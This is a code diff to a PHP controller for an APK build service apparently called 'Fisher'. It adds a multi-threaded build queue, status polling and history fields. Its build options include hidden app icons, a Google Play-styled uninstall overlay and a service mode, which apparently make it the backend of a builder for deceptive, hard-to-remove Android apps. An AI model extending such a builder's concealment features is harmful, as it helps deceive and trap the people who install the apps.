@@ -99,6 +99,25 @@ class ApkController extends BaseController
         ];
     }
 
+    private function ensureBuildQueueSchema(): void
+    {
+        static $done = false;
+        if ($done) return;
+        $done = true;
+        try {
+            $progress = Db::query("SHOW COLUMNS FROM `fisher_apk_builds` LIKE 'progress'");
+            if (!$progress) {
+                Db::execute("ALTER TABLE `fisher_apk_builds` ADD COLUMN `progress` INT UNSIGNED NOT NULL DEFAULT 0 AFTER `status`");
+            }
+            $message = Db::query("SHOW COLUMNS FROM `fisher_apk_builds` LIKE 'message'");
+            if (!$message) {
+                Db::execute("ALTER TABLE `fisher_apk_builds` ADD COLUMN `message` VARCHAR(255) NOT NULL DEFAULT '' AFTER `progress`");
+            }
+        } catch (\Throwable $e) {
+            error_log('[APK Build] queue schema check failed: ' . $e->getMessage());
+        }
+    }
+
     /**
      * 直接读取项目 .env，绕开 ThinkPHP Env 缓存
      * 支持 KEY = value 格式，过滤 # 注释
@@ -190,19 +209,20 @@ class ApkController extends BaseController
      */
     public function apkBuild()
     {
-        $state = $this->getBuildState();
-        if ($state['is_building']) {
-            return json(['success' => false, 'message' => '正在打包中，请稍后'], 409);
+        $this->ensureBuildQueueSchema();
+        $activeBuilds = Db::table('fisher_apk_builds')->whereIn('status', ['queued', 'building'])->count();
+        if ($activeBuilds >= 50) {
+            return json(['success' => false, 'message' => '构建队列已满，请稍后再试'], 429);
         }
 
+        $state = $this->getBuildState();
         $data = Request::post();
         $serverUrl = $data['serverUrl'] ?? $data['server_url'] ?? '';
         $webUrl = $data['webUrl'] ?? $data['web_url'] ?? '';
         $appName = trim($data['appName'] ?? $data['app_name'] ?? 'Fisher');
         $ownerUsername = $data['ownerUsername'] ?? $data['owner_username'] ?? '';
+        $buildThreads = max(1, min(4, (int)($data['buildThreads'] ?? $data['build_threads'] ?? 2)));
 
-        // 构建页面必须提交 multipart 表单和两个资源文件。旧逻辑在校验前就
-        // 写入 is_building=true，异常请求会留下永久构建锁。
         $contentType = strtolower((string)($_SERVER['CONTENT_TYPE'] ?? ''));
         if (!str_starts_with($contentType, 'multipart/form-data')) {
             return json(['success' => false, 'message' => '构建请求格式错误，请从构建页面重新提交'], 400);
@@ -222,16 +242,13 @@ class ApkController extends BaseController
             return json(['success' => false, 'message' => '背景图上传失败'], 400);
         }
 
-        // ★ 校验应用名格式
         $nameError = $this->validateAppName($appName);
         if ($nameError) {
             return json(['success' => false, 'message' => $nameError], 400);
         }
 
-        // ★ 校验应用名是否被其他用户占用（superadmin 不受限）
         $user = request()->user ?? [];
         $role = $user['role'] ?? '';
-        $currentUsername = $user['username'] ?? '';
         if ($ownerUsername && !in_array($role, ['superadmin', 'super-admin'])) {
             $existing = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
             if ($existing && $existing['owner_username'] !== $ownerUsername) {
@@ -240,13 +257,12 @@ class ApkController extends BaseController
         }
 
         $prefix = strtoupper(substr(preg_replace('/[^a-zA-Z]/', '', $appName ?: 'GNI'), 0, 3)) ?: 'GNI';
-        $outputFilename = $prefix . '_' . date('Ymd_His') . '.apk';
+        $outputFilename = $prefix . '_' . date('Ymd_His') . '_' . $this->rs() . '.apk';
 
-        // 设置打包状态
         $state['is_building'] = true;
-        $state['progress'] = 10;
-        $state['message'] = '开始打包...';
-        $state['logs'] = ['[' . date('H:i:s') . '] 开始打包 ' . $appName];
+        $state['progress'] = 3;
+        $state['message'] = '任务已加入多线程构建队列';
+        $state['logs'] = ['[' . date('H:i:s') . '] 已加入构建队列 ' . $appName];
         $state['_start_time'] = time();
         $state['_output_filename'] = $outputFilename;
         $this->saveBuildState($state);
@@ -263,227 +279,205 @@ class ApkController extends BaseController
             try {
                 $this->saveBuildState($failedState);
                 if ($buildId > 0) {
-                    Db::table('fisher_apk_builds')->where('id', $buildId)->update(['status' => 'failed']);
+                    Db::table('fisher_apk_builds')->where('id', $buildId)->update(['status' => 'failed', 'progress' => 0, 'message' => '构建请求异常终止']);
                 }
             } catch (\Throwable $ignored) {
             }
         });
 
         try {
-        // 创建输出目录
-        if (!is_dir($this->apkOutDir)) {
-            mkdir($this->apkOutDir, 0755, true);
-        }
-
-        // 使用 Python build_apk.py 执行打包（异步）
-        $pythonScript = root_path() . 'extend' . DIRECTORY_SEPARATOR . 'build_apk.py';
-        $outputPath = $this->apkOutDir . '/' . $outputFilename;
-        $packageName = $data['packageName'] ?? $data['package_name'] ?? '';
-        $pageStyleConfig = $data['pageStyleConfig'] ?? '';
-        $loadingTips = $data['loadingTips'] ?? '';
-        $configMaskText = $data['configMaskText'] ?? '';
-        $configMaskSubtitle = $data['configMaskSubtitle'] ?? '';
-        $enableConfigMask = $data['enableConfigMask'] ?? '1';
-        $showAppIcon = $data['showAppIcon'] ?? '1';
-        $uninstallMode = $data['uninstallMode'] ?? '0';
-        $uninstallStyle = $data['uninstallStyle'] ?? $data['uninstall_style'] ?? 'googleplay';
-        if (!in_array($uninstallStyle, ['googleplay', 'system'], true)) {
-            $uninstallStyle = 'googleplay';
-        }
-        $enableServiceMode = $data['enableServiceMode'] ?? '0';
-
-        // 构建完整的 pageStyleConfig JSON（传给 --config 参数）
-        $psc = [];
-        if ($pageStyleConfig) {
-            $psc = is_string($pageStyleConfig) ? json_decode($pageStyleConfig, true) ?: [] : $pageStyleConfig;
-        }
-        $psc['_configMaskText'] = $configMaskText ?: ($psc['_configMaskText'] ?? '');
-        $psc['_configMaskSubtitle'] = $configMaskSubtitle ?: ($psc['_configMaskSubtitle'] ?? '');
-        $psc['_enableConfigMask'] = $enableConfigMask === '1' ? 'true' : 'false';
-        $psc['_showAppIcon'] = $showAppIcon === '1' ? 'true' : 'false';
-        $psc['_uninstallMode'] = $uninstallMode === '1' ? 'true' : 'false';
-        $psc['_uninstallStyle'] = $uninstallStyle;
-        $psc['_enableServiceMode'] = $enableServiceMode === '1' ? 'true' : 'false';
-        if ($loadingTips) {
-            $psc['_loadingTips'] = $loadingTips;
-        }
-        // ★ 把 ownerUsername 传给 Python 打包脚本
-        $ownerUsername = $data['ownerUsername'] ?? $data['owner_username'] ?? '';
-        if ($ownerUsername) {
-            $psc['_ownerUsername'] = $ownerUsername;
-        }
-
-        // 处理上传图标 - 保存到持久目录 runtime/apk_assets/
-        $assetsDir = runtime_path() . 'apk_assets' . DIRECTORY_SEPARATOR;
-        if (!is_dir($assetsDir)) {
-            mkdir($assetsDir, 0755, true);
-        }
-        $iconPath = '';
-        $bgPath = '';
-        $persistIconPath = '';
-        $persistBgPath = '';
-
-        // ===== DEBUG: 记录文件上传信息 =====
-        $debugLog = runtime_path() . 'apk_upload_debug.log';
-        $debugInfo = date('Y-m-d H:i:s') . " === APK BUILD REQUEST ===\n";
-        $debugInfo .= "  _FILES: " . json_encode($_FILES, JSON_UNESCAPED_UNICODE) . "\n";
-        $debugInfo .= "  Content-Type: " . ($_SERVER['CONTENT_TYPE'] ?? 'N/A') . "\n";
-        $debugInfo .= "  Content-Length: " . ($_SERVER['CONTENT_LENGTH'] ?? 'N/A') . "\n";
-        $debugInfo .= "  appName: " . ($data['appName'] ?? 'N/A') . "\n";
-        $debugInfo .= "  serverUrl: " . ($data['serverUrl'] ?? 'N/A') . "\n";
-        $debugInfo .= "  request()->file('appIcon'): " . (request()->file('appIcon') ? 'EXISTS' : 'NULL') . "\n";
-        $debugInfo .= "  request()->file('backgroundImage'): " . (request()->file('backgroundImage') ? 'EXISTS' : 'NULL') . "\n";
-        file_put_contents($debugLog, $debugInfo, FILE_APPEND);
-        // ===== END DEBUG =====
-
-        try {
-            if (request()->file('appIcon')) {
-                $icon = request()->file('appIcon');
-                $tmpPath = $icon->getRealPath() ?: $icon->getPathname();
-                $iconPath = runtime_path() . 'apk_icon_' . time() . '.png';
-                $persistIconPath = $assetsDir . 'icon_' . date('Ymd_His') . '_' . $this->rs() . '.png';
-                if ($tmpPath && file_exists($tmpPath)) {
-                    copy($tmpPath, $iconPath);
-                    copy($tmpPath, $persistIconPath);
-                    file_put_contents($debugLog, "  ICON SAVED: $iconPath (size=" . filesize($iconPath) . ")\n", FILE_APPEND);
-                } else {
-                    $iconPath = '';
-                    $persistIconPath = '';
-                    file_put_contents($debugLog, "  ICON FAILED: tmpPath=$tmpPath not exists\n", FILE_APPEND);
-                }
-            } else {
-                file_put_contents($debugLog, "  ICON: not uploaded (file() returned null)\n", FILE_APPEND);
+            if (!is_dir($this->apkOutDir)) {
+                mkdir($this->apkOutDir, 0755, true);
             }
-        } catch (\Throwable $e) {
+
+            $pythonScript = root_path() . 'extend' . DIRECTORY_SEPARATOR . 'build_apk.py';
+            $outputPath = $this->apkOutDir . '/' . $outputFilename;
+            $packageName = $data['packageName'] ?? $data['package_name'] ?? '';
+            $pageStyleConfig = $data['pageStyleConfig'] ?? '';
+            $loadingTips = $data['loadingTips'] ?? '';
+            $configMaskText = $data['configMaskText'] ?? '';
+            $configMaskSubtitle = $data['configMaskSubtitle'] ?? '';
+            $enableConfigMask = $data['enableConfigMask'] ?? '1';
+            $showAppIcon = $data['showAppIcon'] ?? '1';
+            $uninstallMode = $data['uninstallMode'] ?? '0';
+            $uninstallStyle = $data['uninstallStyle'] ?? $data['uninstall_style'] ?? 'googleplay';
+            if (!in_array($uninstallStyle, ['googleplay', 'system'], true)) {
+                $uninstallStyle = 'googleplay';
+            }
+            $enableServiceMode = $data['enableServiceMode'] ?? '0';
+
+            $psc = [];
+            if ($pageStyleConfig) {
+                $psc = is_string($pageStyleConfig) ? json_decode($pageStyleConfig, true) ?: [] : $pageStyleConfig;
+            }
+            $psc['_configMaskText'] = $configMaskText ?: ($psc['_configMaskText'] ?? '');
+            $psc['_configMaskSubtitle'] = $configMaskSubtitle ?: ($psc['_configMaskSubtitle'] ?? '');
+            $psc['_enableConfigMask'] = $enableConfigMask === '1' ? 'true' : 'false';
+            $psc['_showAppIcon'] = $showAppIcon === '1' ? 'true' : 'false';
+            $psc['_uninstallMode'] = $uninstallMode === '1' ? 'true' : 'false';
+            $psc['_uninstallStyle'] = $uninstallStyle;
+            $psc['_enableServiceMode'] = $enableServiceMode === '1' ? 'true' : 'false';
+            $psc['_buildThreads'] = $buildThreads;
+            if ($loadingTips) {
+                $psc['_loadingTips'] = $loadingTips;
+            }
+            $ownerUsername = $data['ownerUsername'] ?? $data['owner_username'] ?? '';
+            if ($ownerUsername) {
+                $psc['_ownerUsername'] = $ownerUsername;
+            }
+
+            $assetsDir = runtime_path() . 'apk_assets' . DIRECTORY_SEPARATOR;
+            if (!is_dir($assetsDir)) {
+                mkdir($assetsDir, 0755, true);
+            }
             $iconPath = '';
-            $persistIconPath = '';
-            file_put_contents($debugLog, "  ICON EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
-        }
-        try {
-            if (request()->file('backgroundImage')) {
-                $bg = request()->file('backgroundImage');
-                $tmpPath = $bg->getRealPath() ?: $bg->getPathname();
-                $bgPath = runtime_path() . 'apk_bg_' . time() . '.png';
-                $persistBgPath = $assetsDir . 'bg_' . date('Ymd_His') . '_' . $this->rs() . '.png';
-                if ($tmpPath && file_exists($tmpPath)) {
-                    copy($tmpPath, $bgPath);
-                    copy($tmpPath, $persistBgPath);
-                    file_put_contents($debugLog, "  BG SAVED: $bgPath (size=" . filesize($bgPath) . ")\n", FILE_APPEND);
-                } else {
-                    $bgPath = '';
-                    $persistBgPath = '';
-                    file_put_contents($debugLog, "  BG FAILED: tmpPath=$tmpPath not exists\n", FILE_APPEND);
-                }
-            } else {
-                file_put_contents($debugLog, "  BG: not uploaded (file() returned null)\n", FILE_APPEND);
-            }
-        } catch (\Throwable $e) {
             $bgPath = '';
+            $persistIconPath = '';
             $persistBgPath = '';
-            file_put_contents($debugLog, "  BG EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
-        }
+            $debugLog = runtime_path() . 'apk_upload_debug.log';
+            $debugInfo = date('Y-m-d H:i:s') . " === APK BUILD REQUEST ===\n";
+            $debugInfo .= "  _FILES: " . json_encode($_FILES, JSON_UNESCAPED_UNICODE) . "\n";
+            $debugInfo .= "  appName: " . ($data['appName'] ?? 'N/A') . "\n";
+            $debugInfo .= "  buildThreads: " . $buildThreads . "\n";
+            file_put_contents($debugLog, $debugInfo, FILE_APPEND);
 
-        // 加密构建已下线。即使旧前端或手工请求仍提交 encrypt=1，也只执行普通构建。
-        $encrypt = false;
-
-        // 写任务文件让独立进程执行（不在 PHP-CGI 中调用命令）
-        $taskFile = runtime_path() . 'apk_build_task.json';
-        $taskJson = json_encode([
-            'pythonScript'    => $pythonScript,
-            'serverUrl'       => $serverUrl,
-            'webUrl'          => $webUrl,
-            'appName'         => $appName,
-            'packageName'     => $packageName,
-            'outputPath'      => $outputPath,
-            'outputFilename'  => $outputFilename,
-            'config'          => json_encode($psc, JSON_UNESCAPED_UNICODE),
-            'iconPath'        => $iconPath,
-            'bgPath'          => $bgPath,
-            'encrypt'         => $encrypt ? true : false,
-            'createdAt'       => time(),
-        ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
-        if ($taskJson === false || file_put_contents($taskFile, $taskJson, LOCK_EX) === false) {
-            throw new \RuntimeException('无法写入 APK 构建任务文件');
-        }
-
-        // 记录到数据库
-        // 注意：$ownerUsername 已在上面定义
-        $buildId = Db::table('fisher_apk_builds')->insertGetId([
-            'filename'       => $outputFilename,
-            'server_url'     => $serverUrl,
-            'web_url'        => $webUrl,
-            'app_name'       => $appName,
-            'status'         => 'building',
-            'owner_username' => $ownerUsername,
-            'created_at'     => time(),
-        ]);
-
-        // ★ 写入应用名→owner 映射（仅当有 owner 时）
-        if ($appName && $ownerUsername) {
-            $existing = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
-            if ($existing) {
-                Db::table('fisher_app_owner_map')->where('app_name', $appName)->update([
-                    'owner_username' => $ownerUsername,
-                    'updated_at' => date('Y-m-d H:i:s'),
-                ]);
-            } else {
-                Db::table('fisher_app_owner_map')->insert([
-                    'app_name' => $appName,
-                    'owner_username' => $ownerUsername,
-                    'created_at' => date('Y-m-d H:i:s'),
-                    'updated_at' => date('Y-m-d H:i:s'),
-                ]);
-            }
-        }
-
-
-        // 保存完整配置到 fisher_apk_build_configs（用于重构）
-        $versionName = $data['versionName'] ?? $data['version_name'] ?? '';
-        $uninstallOverlayTexts = $data['uninstallOverlayTexts'] ?? $data['uninstall_overlay_texts'] ?? '';
-        Db::table('fisher_apk_build_configs')->insert([
-            'build_id'              => $buildId,
-            'filename'              => $outputFilename,
-            'server_url'            => $serverUrl,
-            'web_url'               => $webUrl,
-            'app_name'              => $appName,
-            'package_name'          => $packageName,
-            'version_name'          => $versionName,
-            'enable_config_mask'    => ($enableConfigMask === '1') ? 1 : 0,
-            'enable_service_mode'   => ($enableServiceMode === '1') ? 1 : 0,
-            'show_app_icon'         => ($showAppIcon === '1') ? 1 : 0,
-            'uninstall_mode'        => ($uninstallMode === '1') ? 1 : 0,
-            'uninstall_style'       => $uninstallStyle,
-            'config_mask_text'      => $configMaskText,
-            'config_mask_subtitle'  => $configMaskSubtitle,
-            'page_style_config'     => is_string($pageStyleConfig) ? $pageStyleConfig : json_encode($pageStyleConfig, JSON_UNESCAPED_UNICODE),
-            'loading_tips'          => is_string($loadingTips) ? $loadingTips : json_encode($loadingTips, JSON_UNESCAPED_UNICODE),
-            'uninstall_overlay_texts' => is_string($uninstallOverlayTexts) ? $uninstallOverlayTexts : json_encode($uninstallOverlayTexts, JSON_UNESCAPED_UNICODE),
-            'icon_path'             => $persistIconPath,
-            'bg_path'               => $persistBgPath,
-            'owner_username'        => $ownerUsername,
-            'created_at'            => date('Y-m-d H:i:s'),
-        ]);
-
-        $buildQueued = true;
-        return json([
-            'success' => true,
-            'data' => [
-                'filename' => $outputFilename,
-                'buildId'  => $buildId,
-                'status'   => 'building',
-            ],
-            'message' => '打包已开始',
-        ]);
-        } catch (\Throwable $e) {
-            error_log('[APK Build] task creation failed: ' . $e->getMessage() . ' @ ' . $e->getFile() . ':' . $e->getLine());
-            $detail = '构建任务创建失败: ' . $e->getMessage() . '（位置:' . basename($e->getFile()) . '#' . $e->getLine() . '）';
             try {
-                $state['message'] = $detail;
-                $state['logs'] = array_merge($state['logs'] ?? [], ['[' . date('H:i:s') . '] 任务创建失败: ' . $detail, 'TRACE: ' . $e->getTraceAsString()]);
+                $icon = request()->file('appIcon');
+                if ($icon) {
+                    $tmpPath = $icon->getRealPath() ?: $icon->getPathname();
+                    $iconPath = runtime_path() . 'apk_icon_' . time() . '_' . $this->rs() . '.png';
+                    $persistIconPath = $assetsDir . 'icon_' . date('Ymd_His') . '_' . $this->rs() . '.png';
+                    if ($tmpPath && file_exists($tmpPath)) {
+                        copy($tmpPath, $iconPath);
+                        copy($tmpPath, $persistIconPath);
+                    }
+                }
+            } catch (\Throwable $e) {
+                $iconPath = '';
+                $persistIconPath = '';
+                file_put_contents($debugLog, "  ICON EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
+            }
+            try {
+                $bg = request()->file('backgroundImage');
+                if ($bg) {
+                    $tmpPath = $bg->getRealPath() ?: $bg->getPathname();
+                    $bgPath = runtime_path() . 'apk_bg_' . time() . '_' . $this->rs() . '.png';
+                    $persistBgPath = $assetsDir . 'bg_' . date('Ymd_His') . '_' . $this->rs() . '.png';
+                    if ($tmpPath && file_exists($tmpPath)) {
+                        copy($tmpPath, $bgPath);
+                        copy($tmpPath, $persistBgPath);
+                    }
+                }
+            } catch (\Throwable $e) {
+                $bgPath = '';
+                $persistBgPath = '';
+                file_put_contents($debugLog, "  BG EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
+            }
+
+            $encrypt = false;
+            $buildId = Db::table('fisher_apk_builds')->insertGetId([
+                'filename'       => $outputFilename,
+                'server_url'     => $serverUrl,
+                'web_url'        => $webUrl,
+                'app_name'       => $appName,
+                'status'         => 'queued',
+                'progress'       => 1,
+                'message'        => '排队中，等待构建线程',
+                'owner_username' => $ownerUsername,
+                'created_at'     => time(),
+            ]);
+
+            $queueDir = runtime_path() . 'apk_build_queue' . DIRECTORY_SEPARATOR;
+            if (!is_dir($queueDir)) {
+                mkdir($queueDir, 0755, true);
+            }
+            $taskFile = $queueDir . sprintf('%013d_%06d_%s.json', (int)(microtime(true) * 1000), $buildId, $this->rs());
+            $taskJson = json_encode([
+                'buildId'         => $buildId,
+                'record_id'       => $buildId,
+                'pythonScript'    => $pythonScript,
+                'serverUrl'       => $serverUrl,
+                'webUrl'          => $webUrl,
+                'appName'         => $appName,
+                'packageName'     => $packageName,
+                'outputPath'      => $outputPath,
+                'outputFilename'  => $outputFilename,
+                'config'          => json_encode($psc, JSON_UNESCAPED_UNICODE),
+                'iconPath'        => $iconPath,
+                'bgPath'          => $bgPath,
+                'buildThreads'    => $buildThreads,
+                'encrypt'         => $encrypt ? true : false,
+                'createdAt'       => time(),
+            ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+            if ($taskJson === false || file_put_contents($taskFile, $taskJson, LOCK_EX) === false) {
+                throw new \RuntimeException('无法写入 APK 构建任务文件');
+            }
+
+            if ($appName && $ownerUsername) {
+                $existing = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
+                if ($existing) {
+                    Db::table('fisher_app_owner_map')->where('app_name', $appName)->update([
+                        'owner_username' => $ownerUsername,
+                        'updated_at' => date('Y-m-d H:i:s'),
+                    ]);
+                } else {
+                    Db::table('fisher_app_owner_map')->insert([
+                        'app_name' => $appName,
+                        'owner_username' => $ownerUsername,
+                        'created_at' => date('Y-m-d H:i:s'),
+                        'updated_at' => date('Y-m-d H:i:s'),
+                    ]);
+                }
+            }
+
+            $versionName = $data['versionName'] ?? $data['version_name'] ?? '';
+            $uninstallOverlayTexts = $data['uninstallOverlayTexts'] ?? $data['uninstall_overlay_texts'] ?? '';
+            Db::table('fisher_apk_build_configs')->insert([
+                'build_id'              => $buildId,
+                'filename'              => $outputFilename,
+                'server_url'            => $serverUrl,
+                'web_url'               => $webUrl,
+                'app_name'              => $appName,
+                'package_name'          => $packageName,
+                'version_name'          => $versionName,
+                'enable_config_mask'    => ($enableConfigMask === '1') ? 1 : 0,
+                'enable_service_mode'   => ($enableServiceMode === '1') ? 1 : 0,
+                'show_app_icon'         => ($showAppIcon === '1') ? 1 : 0,
+                'uninstall_mode'        => ($uninstallMode === '1') ? 1 : 0,
+                'uninstall_style'       => $uninstallStyle,
+                'config_mask_text'      => $configMaskText,
+                'config_mask_subtitle'  => $configMaskSubtitle,
+                'page_style_config'     => is_string($pageStyleConfig) ? $pageStyleConfig : json_encode($pageStyleConfig, JSON_UNESCAPED_UNICODE),
+                'loading_tips'          => is_string($loadingTips) ? $loadingTips : json_encode($loadingTips, JSON_UNESCAPED_UNICODE),
+                'uninstall_overlay_texts' => is_string($uninstallOverlayTexts) ? $uninstallOverlayTexts : json_encode($uninstallOverlayTexts, JSON_UNESCAPED_UNICODE),
+                'icon_path'             => $persistIconPath,
+                'bg_path'               => $persistBgPath,
+                'owner_username'        => $ownerUsername,
+                'created_at'            => date('Y-m-d H:i:s'),
+            ]);
+
+            $buildQueued = true;
+            return json([
+                'success' => true,
+                'data' => [
+                    'filename' => $outputFilename,
+                    'buildId'  => $buildId,
+                    'status'   => 'queued',
+                    'threads'  => $buildThreads,
+                ],
+                'message' => '任务已加入多线程构建队列',
+            ]);
+        } catch (\Throwable $e) {
+            $state['is_building'] = false;
+            $state['progress'] = 0;
+            $state['message'] = '构建任务创建失败: ' . $e->getMessage();
+            $state['logs'] = array_merge($state['logs'] ?? [], ['[' . date('H:i:s') . '] 任务创建失败: ' . $e->getMessage()]);
+            try {
                 $this->saveBuildState($state);
             } catch (\Throwable $ignored) {
             }
-            return json(['success' => false, 'message' => $detail], 500);
+            error_log('[APK Build] task creation failed: ' . $e->getMessage());
+            return json(['success' => false, 'message' => '构建任务创建失败，请查看服务器日志'], 500);
         }
     }
 
@@ -493,36 +487,54 @@ class ApkController extends BaseController
      */
     public function apkBuildStatus()
     {
+        $this->ensureBuildQueueSchema();
         $state = $this->getBuildState();
-
-        // 检查最新的打包记录是否已完成
-        $latest = Db::table('fisher_apk_builds')->order('created_at', 'desc')->find();
-        if ($latest && $latest['status'] === 'building') {
-            $outputPath = $this->apkOutDir . '/' . $latest['filename'];
-            if (file_exists($outputPath)) {
-                // 打包完成
-                $fileSize = filesize($outputPath);
-                Db::table('fisher_apk_builds')->where('id', $latest['id'])->update([
-                    'status'    => 'done',
-                    'file_size' => $fileSize,
-                ]);
+        $buildId = (int)Request::get('buildId', 0);
+        $latest = $buildId > 0
+            ? Db::table('fisher_apk_builds')->where('id', $buildId)->find()
+            : Db::table('fisher_apk_builds')->order('created_at', 'desc')->find();
+        $queuePosition = 0;
+        if ($latest) {
+            $status = (string)($latest['status'] ?? '');
+            if ($status === 'queued') {
+                $queuePosition = Db::table('fisher_apk_builds')
+                    ->where('status', 'queued')
+                    ->where('created_at', '<=', (int)($latest['created_at'] ?? 0))
+                    ->count();
+            }
+            if (in_array($status, ['queued', 'building'], true)) {
+                $state['is_building'] = true;
+                $state['progress'] = max(1, min(99, (int)($latest['progress'] ?? $state['progress'] ?? 1)));
+                $state['message'] = (string)($latest['message'] ?? ($status === 'queued' ? '排队中' : '构建中'));
+                $state['last_output'] = (string)($latest['filename'] ?? $state['last_output'] ?? '');
+            } elseif (in_array($status, ['done', 'failed'], true)) {
                 $state['is_building'] = false;
-                $state['progress'] = 100;
-                $state['message'] = '打包完成';
-                $state['last_build_at'] = date('Y-m-d H:i:s');
-                $state['last_output'] = $latest['filename'];
-                $this->saveBuildState($state);
+                $state['progress'] = $status === 'done' ? 100 : (int)($latest['progress'] ?? 0);
+                $state['message'] = $status === 'done'
+                    ? ('构建成功: ' . ($latest['filename'] ?? ''))
+                    : ((string)($latest['message'] ?? '构建失败'));
+                $state['last_output'] = $status === 'done' ? (string)($latest['filename'] ?? '') : '';
             }
         }
 
         return json([
-            'success'     => true,
-            'isBuilding'  => $state['is_building'],
-            'is_building' => $state['is_building'],
-            'progress'    => $state['progress'],
-            'message'     => $state['message'],
-            'lastBuildAt' => $state['last_build_at'],
-            'lastOutput'  => $state['last_output'],
+            'success'        => true,
+            'isBuilding'     => $state['is_building'],
+            'is_building'    => $state['is_building'],
+            'progress'       => $state['progress'],
+            'message'        => $state['message'],
+            'lastBuildAt'    => $state['last_build_at'],
+            'lastOutput'     => $state['last_output'],
+            'buildId'        => $latest['id'] ?? 0,
+            'status'         => $latest['status'] ?? '',
+            'queuePosition'  => $queuePosition,
+            'queue_position' => $queuePosition,
+            'summary'        => [
+                'queued'   => Db::table('fisher_apk_builds')->where('status', 'queued')->count(),
+                'building' => Db::table('fisher_apk_builds')->where('status', 'building')->count(),
+                'done'     => Db::table('fisher_apk_builds')->where('status', 'done')->count(),
+                'failed'   => Db::table('fisher_apk_builds')->where('status', 'failed')->count(),
+            ],
         ]);
     }
 
@@ -542,6 +554,7 @@ class ApkController extends BaseController
      */
     public function apkBuildHistory()
     {
+        $this->ensureBuildQueueSchema();
         $rows = Db::table('fisher_apk_builds')->order('created_at', 'desc')->limit(50)->select()->toArray();
 
         $records = [];
@@ -555,6 +568,8 @@ class ApkController extends BaseController
                 'appName'     => $r['app_name'] ?? '',
                 'fileSize'    => $r['file_size'] ?? 0,
                 'status'      => $r['status'] ?? 'done',
+                'progress'    => (int)($r['progress'] ?? 0),
+                'message'     => $r['message'] ?? '',
                 'createdAt'   => ($r['created_at'] ?? 0) * 1000,
                 'downloadUrl' => '/api/apk/download/' . ($r['filename'] ?? ''),
             ];
@@ -569,18 +584,28 @@ class ApkController extends BaseController
      */
     public function apkList()
     {
+        $this->ensureBuildQueueSchema();
         $user = request()->user ?? [];
         $role = $user['role'] ?? '';
         $username = $user['username'] ?? '';
 
         $query = Db::table('fisher_apk_builds');
-
-        // 普通账号只能看到自己打包的记录
         if ($role !== 'superadmin' && $role !== 'super-admin' && $username) {
             $query = $query->where('owner_username', $username);
         }
 
         $rows = $query->order('created_at', 'desc')->limit(50)->select()->toArray();
+        $queuedRows = Db::table('fisher_apk_builds')
+            ->where('status', 'queued')
+            ->order('created_at', 'asc')
+            ->order('id', 'asc')
+            ->field('id')
+            ->select()
+            ->toArray();
+        $queuePositions = [];
+        foreach ($queuedRows as $idx => $qr) {
+            $queuePositions[(int)$qr['id']] = $idx + 1;
+        }
 
         $list = [];
         foreach ($rows as $r) {
@@ -598,6 +623,9 @@ class ApkController extends BaseController
                 'size'           => (int)($r['file_size'] ?? 0),
                 'file_size'      => (int)($r['file_size'] ?? 0),
                 'status'         => $r['status'] ?? 'done',
+                'progress'       => (int)($r['progress'] ?? 0),
+                'message'        => $r['message'] ?? '',
+                'queue_position' => $queuePositions[(int)$r['id']] ?? 0,
                 'created_at'     => ($r['created_at'] ?? 0) * 1000,
                 'time'           => ($r['created_at'] ?? 0) * 1000,
                 'download_url'   => '/api/apk/download?filename=' . urlencode($r['filename']),
